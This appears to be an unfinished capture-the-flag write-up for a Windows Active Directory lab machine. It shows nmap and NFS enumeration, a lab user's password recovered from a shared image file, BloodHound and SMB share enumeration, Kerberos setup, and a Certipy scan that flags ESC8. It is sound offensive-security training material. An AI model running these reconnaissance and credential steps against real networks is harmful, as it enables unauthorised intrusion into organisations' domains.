
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Windows                  |
| **Difficulty**   | Medium                   |
| **Release Date** | YYYY-MM-DD               |
| **State**        | YYYY-MM-DD               |
| **IP**           | 10.10.10.X               |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV vulncicada.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 09:55 EDT
Nmap scan report for vulncicada.htb (10.129.234.48)
Host is up (0.029s latency).
Not shown: 984 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-29 13:55:28Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-29T13:35:40
|_Not valid after:  2027-09-29T13:35:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-29T13:35:40
|_Not valid after:  2027-09-29T13:35:40
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-29T13:35:40
|_Not valid after:  2027-09-29T13:35:40
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-29T13:35:40
|_Not valid after:  2027-09-29T13:35:40
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-29T13:56:50+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-09-28T13:43:25
|_Not valid after:  2027-03-30T13:43:25
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-29T13:56:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.12 seconds

```

```
sudo nmap --script nfs* -sV -p111,2049 vulncicada.htb
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 10:31 EDT
Nmap scan report for vulncicada.htb (10.129.234.48)
Host is up (0.027s latency).

PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind?
| nfs-statfs: 
|   Filesystem  1K-blocks   Used        Available  Use%  Maxfilesize  Maxlink
|_  /profiles   16105468.0  12721588.0  3383880.0  79%   16.0T        1023
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
| nfs-ls: Volume /profiles
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID         GID         SIZE  TIME                 FILENAME
| rwxrwxrwx   4294967294  4294967294  4096  2025-06-03T10:21:17  .
| ??????????  ?           ?           ?     ?                    ..
| rwxrwxrwx   4294967294  4294967294  64    2024-09-15T13:25:16  Administrator
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Daniel.Marshall
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Debra.Wright
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:30:51  Jane.Carter
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Jordan.Francis
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Joyce.Andrews
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Katie.Ward
| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Megan.Simpson
|_
| nfs-showmount: 
|_  /profiles 
2049/tcp open  mountd   1-3 (RPC #100005)
| nfs-showmount: 
|_  /profiles 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.18 seconds
                                                                   
```

### NFS Enumeration

```
 sudo mount -t nfs vulncicada.htb:/ ./NFS/ -o nolock
```

```
┌──(kali㉿kali)-[~/machines/vulncicada/NFS/profiles]
└─$ ls * 
Administrator:
Documents  vacation.png

Daniel.Marshall:

Debra.Wright:

Jane.Carter:

Jordan.Francis:

Joyce.Andrews:

Katie.Ward:

Megan.Simpson:

Richard.Gibbons:

Rosie.Powell:
Documents  marketing.png

Shirley.West:
                                 
```

```
┌──(kali㉿kali)-[~/machines/vulncicada/NFS]
└─$ cd Rosie.Powell
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/vulncicada/NFS/Rosie.Powell]
└─$ ls
Documents  marketing.png
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/vulncicada/NFS/Rosie.Powell]
└─$ sudo chmod 777 marketing.png

```

Rosie.Powell:Cicada123

### SMB enumeration

```
sudo bloodhound-python -u 'Rosie.Powell' -p 'Cicada123' -ns 10.129.150.101 -d cicada.vl -c all --zip
[sudo] password for kali: 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: cicada.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc-jpq225.cicada.vl
INFO: Testing resolved hostname connectivity dead:beef::b7f1:83f4:e73d:b6f3
INFO: Trying LDAP connection to dead:beef::b7f1:83f4:e73d:b6f3
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc-jpq225.cicada.vl
INFO: Testing resolved hostname connectivity dead:beef::b7f1:83f4:e73d:b6f3
INFO: Trying LDAP connection to dead:beef::b7f1:83f4:e73d:b6f3
INFO: Found 14 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC-JPQ225.cicada.vl
INFO: Done in 00M 08S
INFO: Compressing output into 20260929120757_bloodhound.zip

```

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
                                                                                                              
```

```
smbclient -U Rosie.Powell //DC-JPQ225.cicada.vl/CertEnroll --password='Cicada123' -k
WARNING: The option -k|--kerberos is deprecated!
gensec_spnego_client_negTokenInit_step: Could not find a suitable mechtype in NEG_TOKEN_INIT
session setup failed: NT_STATUS_INVALID_PARAMETER

```

configure /etc/krb5.conf:

```
[libdefaults]
    default_realm = CICADA.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    CICADA.VL = {
        kdc = DC-JPQ225.cicada.vl
        admin_server = DC-JPQ225.cicada.vl
    }

[domain_realm]
    .cicada.vl = CICADA.VL
    cicada.vl = CICADA.VL
```

```
kinit Rosie.Powell@CICADA.VL # password: Cicada123 klist # confirm you got a TGT
```

```
mbclient -U Rosie.Powell //DC-JPQ225.cicada.vl/CertEnroll --password='Cicada123' -k
WARNING: The option -k|--kerberos is deprecated!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 29 11:30:48 2026
  ..                                  D        0  Fri Sep 13 11:17:59 2024
  cicada-DC-JPQ225-CA(1)+.crl         A      741  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(1).crl          A      941  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(10)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(10).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(11)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(11).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(12)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(12).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(13)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(13).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(14)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(14).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(15)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(15).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(16)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(16).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(17)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(17).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(18)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(18).crl         A      943  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(19)+.crl        A      742  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(19).crl         A      943  Tue Sep 29 11:25:56 2026
  cicada-DC-JPQ225-CA(2)+.crl         A      741  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(2).crl          A      941  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(20)+.crl        A      742  Tue Sep 29 11:25:56 2026
  cicada-DC-JPQ225-CA(20).crl         A      943  Tue Sep 29 11:25:56 2026
  cicada-DC-JPQ225-CA(21)+.crl        A      742  Tue Sep 29 11:25:56 2026
  cicada-DC-JPQ225-CA(21).crl         A      943  Tue Sep 29 11:25:56 2026
  cicada-DC-JPQ225-CA(22)+.crl        A      742  Tue Sep 29 11:25:56 2026
  cicada-DC-JPQ225-CA(22).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(23)+.crl        A      742  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(23).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(24)+.crl        A      742  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(24).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(25)+.crl        A      742  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(25).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(26)+.crl        A      742  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(26).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(27)+.crl        A      742  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(27).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(28)+.crl        A      742  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(28).crl         A      943  Tue Sep 29 11:25:55 2026
  cicada-DC-JPQ225-CA(3)+.crl         A      741  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(3).crl          A      941  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(4)+.crl         A      741  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(4).crl          A      941  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(5)+.crl         A      741  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(5).crl          A      941  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA(6)+.crl         A      741  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(6).crl          A      941  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(7)+.crl         A      741  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(7).crl          A      941  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(8)+.crl         A      741  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(8).crl          A      941  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(9)+.crl         A      741  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA(9).crl          A      941  Tue Sep 29 11:25:57 2026
  cicada-DC-JPQ225-CA+.crl            A      736  Tue Sep 29 11:25:58 2026
  cicada-DC-JPQ225-CA.crl             A      933  Tue Sep 29 11:25:58 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt      A     1385  Sun Sep 15 09:18:43 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1).crt      A      924  Sun Sep 15 03:51:18 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-0).crt      A     1390  Sun Sep 15 09:18:43 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-2).crt      A     1390  Sun Sep 15 09:18:43 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10).crt      A      924  Thu Apr 10 04:44:43 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-11).crt      A     1391  Fri Apr 11 01:48:18 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-9).crt      A     1391  Thu Apr 10 04:57:00 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11).crt      A      924  Thu Apr 10 04:58:25 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-10).crt      A     1391  Fri Apr 11 01:48:18 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-12).crt      A     1391  Fri Apr 11 01:48:18 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12).crt      A      924  Thu Apr 10 05:00:22 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-11).crt      A     1391  Fri Apr 11 01:48:18 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-13).crt      A     1391  Fri Apr 11 01:48:18 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13).crt      A      924  Thu Apr 10 05:03:13 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-12).crt      A     1391  Fri Apr 11 01:48:18 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-14).crt      A     1391  Tue Jun  3 06:21:47 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14).crt      A      924  Fri Apr 11 01:49:42 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-13).crt      A     1391  Tue Jun  3 06:22:11 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-15).crt      A     1391  Tue Jun  3 06:22:11 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15).crt      A      924  Fri Apr 11 01:51:40 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-14).crt      A     1391  Tue Jun  3 06:22:11 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-16).crt      A     1391  Tue Jun  3 06:22:12 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16).crt      A      924  Fri Apr 11 01:53:40 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-15).crt      A     1391  Tue Jun  3 06:22:12 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-17).crt      A     1391  Wed Jun  4 08:51:26 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17).crt      A      924  Tue Jun  3 06:23:15 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-16).crt      A     1391  Wed Jun  4 08:51:26 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-18).crt      A     1391  Wed Jun  4 08:51:26 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18).crt      A      924  Tue Jun  3 06:24:51 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-17).crt      A     1391  Wed Jun  4 08:51:26 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-19).crt      A     1391  Wed Jun  4 08:51:27 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19).crt      A      924  Tue Jun  3 06:26:51 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-18).crt      A     1391  Wed Jun  4 08:51:27 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-20).crt      A     1391  Wed Jun  4 09:34:59 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2).crt      A      924  Sun Sep 15 03:53:03 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-1).crt      A     1390  Sun Sep 15 09:18:44 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-3).crt      A     1390  Sun Sep 29 05:41:29 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20).crt      A      924  Wed Jun  4 08:52:43 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-19).crt      A     1391  Wed Jun  4 09:34:59 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-21).crt      A     1391  Wed Jun  4 09:34:59 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21).crt      A      924  Wed Jun  4 08:54:47 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-20).crt      A     1391  Wed Jun  4 09:34:59 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-22).crt      A     1391  Wed Jun  4 09:34:59 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22).crt      A      924  Wed Jun  4 08:56:47 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-21).crt      A     1391  Wed Jun  4 09:35:00 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-23).crt      A     1391  Wed Jun  4 10:02:35 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23).crt      A      924  Wed Jun  4 09:36:17 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-22).crt      A     1391  Wed Jun  4 10:02:35 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-24).crt      A     1391  Wed Jun  4 10:02:35 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24).crt      A      924  Wed Jun  4 09:38:20 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-23).crt      A     1391  Wed Jun  4 10:02:35 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-25).crt      A     1391  Wed Jun  4 10:02:35 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25).crt      A      924  Wed Jun  4 09:40:21 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-24).crt      A     1391  Wed Jun  4 10:02:35 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-26).crt      A     1391  Tue Sep 29 11:25:45 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26).crt      A      924  Wed Jun  4 10:04:01 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-25).crt      A     1391  Tue Sep 29 11:25:45 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-27).crt      A     1391  Tue Sep 29 11:25:45 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27).crt      A      924  Wed Jun  4 10:05:56 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-26).crt      A     1391  Tue Sep 29 11:25:45 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-28).crt      A     1391  Tue Sep 29 11:25:45 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28).crt      A      924  Wed Jun  4 10:07:56 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28-27).crt      A     1391  Tue Sep 29 11:25:55 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(29).crt      A      924  Tue Sep 29 11:26:49 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3).crt      A      924  Sun Sep 15 09:21:57 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-2).crt      A     1390  Sun Sep 29 05:41:29 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-4).crt      A     1390  Sun Sep 29 05:41:30 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(30).crt      A      924  Tue Sep 29 11:28:48 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(31).crt      A      924  Tue Sep 29 11:30:48 2026
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4).crt      A      924  Sun Sep 15 09:24:13 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-3).crt      A     1390  Sun Sep 29 05:41:30 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-5).crt      A     1390  Thu Apr 10 04:36:39 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5).crt      A      924  Sun Sep 29 05:43:51 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-4).crt      A     1390  Thu Apr 10 04:36:39 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-6).crt      A     1390  Thu Apr 10 04:36:39 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6).crt      A      924  Sun Sep 29 05:44:59 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-5).crt      A     1390  Thu Apr 10 04:36:39 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-7).crt      A     1390  Thu Apr 10 04:36:39 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7).crt      A      924  Sun Sep 29 05:46:59 2024
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-6).crt      A     1390  Thu Apr 10 04:36:39 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-8).crt      A     1390  Thu Apr 10 04:56:48 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8).crt      A      924  Thu Apr 10 04:40:45 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-7).crt      A     1390  Thu Apr 10 04:56:48 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-9).crt      A     1390  Thu Apr 10 04:56:48 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9).crt      A      924  Thu Apr 10 04:42:44 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-10).crt      A     1390  Thu Apr 10 04:56:48 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-8).crt      A     1390  Thu Apr 10 04:56:48 2025
  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt      A      885  Fri Sep 13 06:50:51 2024
  nsrev_cicada-DC-JPQ225-CA.asp       A      331  Fri Sep 13 11:17:59 2024

                4026367 blocks of size 4096. 844639 blocks available
smb: \> 

```

```
cat nsrev_cicada-DC-JPQ225-CA.asp                                                                  
<%
Response.ContentType = "application/x-netscape-revocation"
serialnumber = Request.QueryString
set Admin = Server.CreateObject("CertificateAuthority.Admin")

stat = Admin.IsValidCertificate("DC-JPQ225.cicada.vl\cicada-DC-JPQ225-CA", serialnumber)

if stat = 3 then Response.Write("0") else Response.Write("1") end if
%>

```

```
export KRB5CCNAME=/tmp/krb5cc_1000
```

```
certipy-ad find -u Rosie.Powell@cicada.vl -k -dc-ip 10.129.150.101 -dc-host DC-JPQ225.cicada.vl -vulnerable 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260929144302_Certipy.txt'
[*] Wrote text output to '20260929144302_Certipy.txt'
[*] Saving JSON output to '20260929144302_Certipy.json'
[*] Wrote JSON output to '20260929144302_Certipy.json'
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/machines/vulncicada]
└─$ cat 20260929144302_Certipy.txt                                                                             
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 6E35ADCDBE9E818E466E7A16441E95F3
    Certificate Validity Start          : 2026-09-29 15:20:38+00:00
    Certificate Validity End            : 2526-09-29 15:30:38+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
